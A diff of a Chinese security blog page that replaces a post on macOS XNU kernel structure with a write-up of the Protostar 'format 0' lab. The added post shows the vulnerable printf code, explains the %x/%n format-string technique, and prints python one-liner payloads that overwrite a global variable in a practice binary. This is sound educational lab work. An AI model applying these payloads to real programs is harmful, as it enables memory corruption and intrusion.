@@ -6,153 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://github.com/NULL-ME/NULL-ME.github.io.git">
-  <title>macOS内核知识点整理 | 4chendy</title>
+  <title>Protostar-栈溢出系列学习-format 0 | 4chendy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Darwin结构
-沙盒结构
-XNU源码树
-
-
-目录
-包含的内容
-
-
-
-
-bsd
-内核的BSD组件
-
-
-config
-各种框架的导出符号
-
-
-iokit
-I/OKit驱动程序运行时子系统
-
-
-libkern
-内核主运行时库API
-
-
-osfmk
-内核的Mach组件
-
-
-pexpert
-平台相关的服务（PPC,i386）
-
-
-security
-BSD MAC框架
-
-
-
-BSD子目录
-
-
-子目录
-包含的">
+  <meta name="description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
+0x01 format 0C语言代码
+1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
 <meta property="og:type" content="article">
-<meta property="og:title" content="macOS内核知识点整理">
-<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/2016/12/06/macOS内核框架/macOS内核架构-功能/index.html">
+<meta property="og:title" content="Protostar-栈溢出系列学习-format 0">
+<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/index.html">
 <meta property="og:site_name" content="4chendy">
-<meta property="og:description" content="Darwin结构
-沙盒结构
-XNU源码树
-
-
-目录
-包含的内容
-
-
-
-
-bsd
-内核的BSD组件
-
-
-config
-各种框架的导出符号
-
-
-iokit
-I/OKit驱动程序运行时子系统
-
-
-libkern
-内核主运行时库API
-
-
-osfmk
-内核的Mach组件
-
-
-pexpert
-平台相关的服务（PPC,i386）
-
-
-security
-BSD MAC框架
-
-
-
-BSD子目录
-
-
-子目录
-包含的">
-<meta property="og:image" content="https://raw.githubusercontent.com/NULL-ME/NULL-ME.github.io/master/articlePic/macOS%E5%86%85%E6%A0%B8/Darwin%E7%BB%93%E6%9E%84.png">
-<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/macOS%E5%86%85%E6%A0%B8/%E6%B2%99%E7%9B%92%E7%BB%93%E6%9E%84.png?raw=true">
-<meta property="og:updated_time" content="2017-03-09T05:37:26.000Z">
+<meta property="og:description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
+0x01 format 0C语言代码
+1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-1.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-2.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-3.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-4.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-5.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-6.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-7.png">
+<meta property="og:updated_time" content="2017-04-19T03:58:02.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="macOS内核知识点整理">
-<meta name="twitter:description" content="Darwin结构
-沙盒结构
-XNU源码树
-
-
-目录
-包含的内容
-
-
-
-
-bsd
-内核的BSD组件
-
-
-config
-各种框架的导出符号
-
-
-iokit
-I/OKit驱动程序运行时子系统
-
-
-libkern
-内核主运行时库API
-
-
-osfmk
-内核的Mach组件
-
-
-pexpert
-平台相关的服务（PPC,i386）
-
-
-security
-BSD MAC框架
-
-
-
-BSD子目录
-
-
-子目录
-包含的">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/NULL-ME/NULL-ME.github.io/master/articlePic/macOS%E5%86%85%E6%A0%B8/Darwin%E7%BB%93%E6%9E%84.png">
+<meta name="twitter:title" content="Protostar-栈溢出系列学习-format 0">
+<meta name="twitter:description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
+0x01 format 0C语言代码
+1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
+<meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-1.png">
   
     <link rel="alternative" href="/atom.xml" title="4chendy" type="application/atom+xml">
   
@@ -294,280 +173,49 @@ BSD子目录
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-macOS内核框架/macOS内核架构-功能" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      macOS内核知识点整理
+      Protostar-栈溢出系列学习-format 0
     </h1>
   
 
         
         <a href="" class="archive-article-date">
-  	<time datetime="2016-12-05T16:34:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-06</time>
+  	<time datetime="2016-07-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-07-10</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Darwin结构"><a href="#Darwin结构" class="headerlink" title="Darwin结构"></a>Darwin结构</h2><p><img src="https://raw.githubusercontent.com/NULL-ME/NULL-ME.github.io/master/articlePic/macOS%E5%86%85%E6%A0%B8/Darwin%E7%BB%93%E6%9E%84.png" alt="Darwin"></p>
-<h2 id="沙盒结构"><a href="#沙盒结构" class="headerlink" title="沙盒结构"></a>沙盒结构</h2><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/macOS%E5%86%85%E6%A0%B8/%E6%B2%99%E7%9B%92%E7%BB%93%E6%9E%84.png?raw=true" alt="sandbox"></p>
-<h2 id="XNU源码树"><a href="#XNU源码树" class="headerlink" title="XNU源码树"></a>XNU源码树</h2><table>
-<thead>
-<tr>
-<th>目录</th>
-<th>包含的内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>bsd</td>
-<td>内核的BSD组件</td>
-</tr>
-<tr>
-<td>config</td>
-<td>各种框架的导出符号</td>
-</tr>
-<tr>
-<td>iokit</td>
-<td>I/OKit驱动程序运行时子系统</td>
-</tr>
-<tr>
-<td>libkern</td>
-<td>内核主运行时库API</td>
-</tr>
-<tr>
-<td>osfmk</td>
-<td>内核的Mach组件</td>
-</tr>
-<tr>
-<td>pexpert</td>
-<td>平台相关的服务（PPC,i386）</td>
-</tr>
-<tr>
-<td>security</td>
-<td>BSD MAC框架</td>
-</tr>
-</tbody>
-</table>
-<h3 id="BSD子目录"><a href="#BSD子目录" class="headerlink" title="BSD子目录"></a>BSD子目录</h3><table>
-<thead>
-<tr>
-<th>子目录</th>
-<th>包含的内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>bsm/security</td>
-<td>Basic Security Module(审计子系统)</td>
-</tr>
-<tr>
-<td>conf</td>
-<td>机器相关的Makefile</td>
-</tr>
-<tr>
-<td>crypto</td>
-<td>对称加密算法和散列算法的实现</td>
-</tr>
-<tr>
-<td>dev</td>
-<td>BSD设备（/dev目录项）</td>
-</tr>
-<tr>
-<td>hfs</td>
-<td>macOS默认文件系统（HFS/HFS+）</td>
-</tr>
-<tr>
-<td>i386/machine</td>
-<td>Intel/PPC架构的私有头文件</td>
-</tr>
-<tr>
-<td>kern</td>
-<td>内核的主要代码</td>
-</tr>
-<tr>
-<td>libkern</td>
-<td>内核运行时导出的库（CRC,字符串函数等）</td>
-</tr>
-<tr>
-<td>man</td>
-<td>一些有用的man手册</td>
-</tr>
-<tr>
-<td>net*/netinet</td>
-<td>网络子系统（套接字）和IP协议栈</td>
-</tr>
-<tr>
-<td>nfs</td>
-<td>用于远程文件系统的NFSv3协议栈</td>
-</tr>
-<tr>
-<td>sys</td>
-<td>内核头文件</td>
-</tr>
-<tr>
-<td>vfs</td>
-<td>虚拟文件系统交换（Virtual Filesystem Switch）</td>
-</tr>
-<tr>
-<td>vm</td>
-<td>BSD的虚拟内存处理程序</td>
-</tr>
-</tbody>
-</table>
-<h3 id="osfmk子目录"><a href="#osfmk子目录" class="headerlink" title="osfmk子目录"></a>osfmk子目录</h3><table>
-<thead>
-<tr>
-<th>子目录</th>
-<th>包含的内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td> chud</td>
-<td>Computer Hardware Understanding                         Development(为macOS诊断工具提供内核支持)</td>
-</tr>
-<tr>
-<td> conf</td>
-<td>机器相关的Makefile</td>
-</tr>
-<tr>
-<td> console</td>
-<td>控制台初始化,串口,引导视频和内核崩溃</td>
-</tr>
-<tr>
-<td> ddb</td>
-<td>内核调试器（已弃用）</td>
-</tr>
-<tr>
-<td> default_pager</td>
-<td>VM分页器</td>
-</tr>
-<tr>
-<td> device</td>
-<td>Mach对I/OKit和设备的支持</td>
-</tr>
-<tr>
-<td> i386/ppc/x86_64</td>
-<td>CPU特定的实现</td>
-</tr>
-<tr>
-<td> ipc</td>
-<td>IPC,port和消息</td>
-</tr>
-<tr>
-<td> kdp</td>
-<td>KDP(调试器)支持</td>
-</tr>
-<tr>
-<td> mach,machine</td>
-<td>Mach通用头文件和机器相关的内核头文件</td>
-</tr>
-<tr>
-<td> man</td>
-<td>唯一涉及到Mach调用的man手册</td>
-</tr>
-<tr>
-<td> pmc/profiling</td>
-<td>PMC性能检测</td>
-</tr>
-<tr>
-<td> UserNotification</td>
-<td>内核到用户态的通知</td>
-</tr>
-<tr>
-<td> vm</td>
-<td>虚拟内存的实现和头文件</td>
-</tr>
-</tbody>
-</table>
-<h3 id="the-xnu-Kernal-of-following-component"><a href="#the-xnu-Kernal-of-following-component" class="headerlink" title="the xnu Kernal of following component"></a>the xnu Kernal of following component</h3><ul>
-<li>Mach servers layer</li>
-<li>BSD primary systerm programming interface provide</li>
-<li>The I/OKit runtime environment for drivers</li>
-<li>libkernal in* kernel library</li>
-<li>libsaan in* kernel library that is normally used only during early systerm startup</li>
-<li>the platform expert hardware abstraction module</li>
-<li>kernel extension various I/OKit family,the majority of loadable device drivers,and some non* I/O Kit extention</li>
-</ul>
-<h2 id="Mach"><a href="#Mach" class="headerlink" title="Mach"></a>Mach</h2><p><strong>If the xnu kernel is the core of Mac OS X, then Mach may be considered the core of xnu</strong>.</p>
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p>
+<h2 id="0x01-format-0"><a href="#0x01-format-0" class="headerlink" title="0x01 format 0"></a>0x01 format 0</h2><p>C语言代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> target;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(target) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  vuln(argv[<span class="number">1</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
+<p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p>
+<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>其他不说，先运行下程序试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-1.png" alt="0-1"><br>再试着输入格式字符试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-2.png" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-3.png" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">local <span class="keyword">variables</span> of <span class="comment">main</span></div><div class="line">saved <span class="comment">registers of main</span></div><div class="line">return <span class="comment">address of main</span></div><div class="line">argc</div><div class="line">argv</div><div class="line">envp</div><div class="line">stack <span class="comment">from startup code</span></div><div class="line">argc</div><div class="line">argv <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends argv[]</span></div><div class="line">environment <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends envp[]</span></div><div class="line">ELF <span class="comment">Auxiliary Table</span></div><div class="line">argv <span class="comment">strings              &lt;--------focus here</span></div><div class="line">environment <span class="comment">strings</span></div><div class="line">program <span class="comment">name</span></div><div class="line">NULL</div></pre></td></tr></table></figure>
+<h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
+<p>关注printf函数，有这么一段话：</p>
 <ul>
-<li>hardware abstraction to some extent</li>
-<li>processor management including symmetric mutiprocessing * and scheduling</li>
-<li>Preemptive multitasking, including support for tasks and threads</li>
-<li>Virtual memory management, including low-level paging, memory protection, sharing, and inheritance<br>$Low-level IPC mechanisms that are the basis for all messaging in the kernel</li>
-<li><p>Real-time support that allows time-sensitive applications (e.g., media applications such as<br>GarageBand and iTunes) to have latency-bounded access to processor resources</p>
-</li>
-<li><p>Kernel debugging support</p>
-</li>
-<li>Console I/O</li>
+<li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li>
 </ul>
-<h2 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h2><ul>
-<li>BSD-style process model</li>
-<li>Signals</li>
-<li>User IDs, permissions, and basic security policies</li>
-<li>POSIX APIs</li>
-<li>Asynchronous I/O APIs (AIO)</li>
-<li>BSD-style system calls</li>
-<li>TCP/IP stack, BSD sockets, and firewalling</li>
-<li>Network Kernel Extensions (NKEs), a type of kernel extension for making the BSD networking architecture fit into xnu[11]</li>
-<li>The virtual file system (VFS) layer and numerous file systems, including a file-system-independent VFS-level journaling mechanism</li>
-<li>System V and POSIX interprocess communication mechanisms</li>
-<li>In-kernel cryptographic framework</li>
-<li>A system notification mechanism based on FreeBSD’s kqueue/kevent mechanism, which is a system-wide service enabling notifications between applications, and from the kernel to applications</li>
-<li>The fsevents file system change notification mechanism that is used by the Spotlight search technology</li>
-<li>Access control lists (ACLs) and the kauth authorization framework</li>
-<li>Various synchronization primitives</li>
-</ul>
-<h2 id="The-I-O-Kit"><a href="#The-I-O-Kit" class="headerlink" title="The I/O Kit"></a>The I/O Kit</h2><ul>
-<li>Extensive programming interfaces, including interfaces for applications and user* space drivers to communicate with the I/O Kit</li>
-<li>Numerous device families such as ATA/ATAPI, FireWire, Graphics, HID, Network, PCI, and USB</li>
-<li>Object* oriented abstractions of devices</li>
-<li>Plug-and-play and dynamic device management (“hot-plugging”)</li>
-<li>Power management</li>
-<li>Preemptive multitasking, threading, symmetric multiprocessing, memory protection, and data management</li>
-<li>Dynamic matching and loading of drivers for multiple bus types</li>
-<li>A database for tracking and maintaining detailed information on instantiated objects (the I/O Registry)</li>
-<li>A database of all I/O Kit classes available on a system (the I/O Catalog)Interfaces for applications and user-space drivers to communicate with the I/O Kit</li>
-<li>Driver stacking</li>
-</ul>
-<h2 id="The-libkern-Library"><a href="#The-libkern-Library" class="headerlink" title="The libkern Library"></a>The libkern Library</h2><ul>
-<li>Dynamic allocation, construction, and destruction objects, with support for a variety of built-in object types such as Arrays, Booleans, and Dictionaries</li>
-<li>Atomic operations and miscellaneous functions such as bcmp(), memcmp(), and strlen()</li>
-<li>Functions for byte-swapping</li>
-<li>Provisions for tracking the number of current instances for each class</li>
-<li>Mechanisms that help alleviate the C++ fragile base-class problem</li>
-</ul>
-<h2 id="The-libsa-Library"><a href="#The-libsa-Library" class="headerlink" title="The libsa Library"></a>The libsa Library</h2><p><strong>libsa is an in-kernel support library essentially an in* kernel linkerused during early system startup for loading kernel extensions,sa=stand-alone,Mac OS X kernel extensions are normally loaded on demand through the kexTD user-space daemon (/usr/libexec/kextd). During early stages of bootstrapping, kextd is not yet available. libsa provides a subset of kextd’s capabilities to the kernel. Examples of specific functionality implemented by libsa for loading, linking, and recording kernel extension object files include the following:</strong></p>
+<p>简单就是说%n可以写入一个内存地址，其值为前面的字符数</p>
 <ul>
-<li>Simple memory allocation</li>
-<li>Binary searching</li>
-<li>Sorting</li>
-<li>Miscellaneous string* handling functions  Symbol remangling</li>
-<li>A dependency graph package used while determining kernel extension dependencies</li>
-<li>Decompression of compressed kernels and verification of checksums</li>
+<li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li>
 </ul>
-<h2 id="The-Platform-Expert"><a href="#The-Platform-Expert" class="headerlink" title="The Platform Expert"></a>The Platform Expert</h2><p><strong>Nubs[In the context of the I/O Kit, a nub is an object that defines an access point and communication channel for a physical device or a logical service. A physical device could be a bus, a disk drive or partition, a graphics card, and so on. Examples of logical services include arbitration, driver matching, and power management.]</strong></p>
-<ul>
-<li>Constructing device trees</li>
-<li>Parsing certain boot arguments</li>
-<li>Identifying the machine, which includes determining processor and bus clock speeds  Accessing power management information</li>
-<li>Retrieving and setting system time</li>
-<li>Retrieving and setting console information</li>
-<li>Halting and restarting the machine</li>
-<li>Accessing the interrupt controller</li>
-<li>Creating the system serial number string</li>
-<li>Saving kernel panic information</li>
-<li>Initializing a “user interface” to be used in case of kernel panics</li>
-<li>Reading and writing the nonvolatile memory (NVRAM)</li>
-<li>Reading and writing the parameter memory (PRAM)</li>
-</ul>
-<h2 id="task-and-thread"><a href="#task-and-thread" class="headerlink" title="task and thread"></a>task and thread</h2><p>任务是一个包含一个或多个可执行线程的任务组，这些线程共享资源和内存空间。Mach的任务是将一对一映射到Unix BSD层的进程。XNU内核也是一个包含多个线程的任务。</p>
+<p>看个例子<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-4.png" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p>
+<h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-5.png" alt="0-5"><br>利用一句话Python反复测试</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*135"</span>'`<span class="string">"</span></div></pre></td></tr></table></figure>
+<p>调整%x的个数，使其target地址为最后一个<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-6.png" alt="0-6"><br>然后将最后一个%x改为%n</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*134+"</span><span class="symbol">%n</span> <span class="string">"'`"</span></div></pre></td></tr></table></figure>
+<p>run!<br><img src="/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-栈溢出系列学习-format/ 0/0-7.png" alt="0-7"><br><strong>成功修改target值!</strong></p>
+<h2 id="0x06-一点感悟"><a href="#0x06-一点感悟" class="headerlink" title="0x06 一点感悟"></a>0x06 一点感悟</h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p>
 
       
 
@@ -607,15 +255,19 @@ BSD子目录
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xnu</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">macos内核</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">BSD</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">printf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">format</a>
         		</li>
       		
 		</ul>
@@ -671,7 +323,7 @@ BSD子目录
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://github.com/NULL-ME/NULL-ME.github.io.git/2016/12/06/macOS内核框架/macOS内核架构-功能/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://github.com/NULL-ME/NULL-ME.github.io.git/2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -685,18 +337,18 @@ BSD子目录
   
 <nav id="article-nav">
   
-    <a href="../../../../../2017/03/05/Mach vm*API/exec函数流程/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="../../../../08/01/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Mach vm*API
+          Protostar-栈溢出系列学习-Stack 3
         
       </div>
     </a>
   
   
-    <a href="../../../../08/05/iOSCrackme/iOSCrackme/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">看雪iOSCrackme破解报告</div>
+    <a href="../../../../06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Protostar-栈溢出系列学习-Stack 2</div>
       <i class="icon-circle-right"></i>
     </a>
   
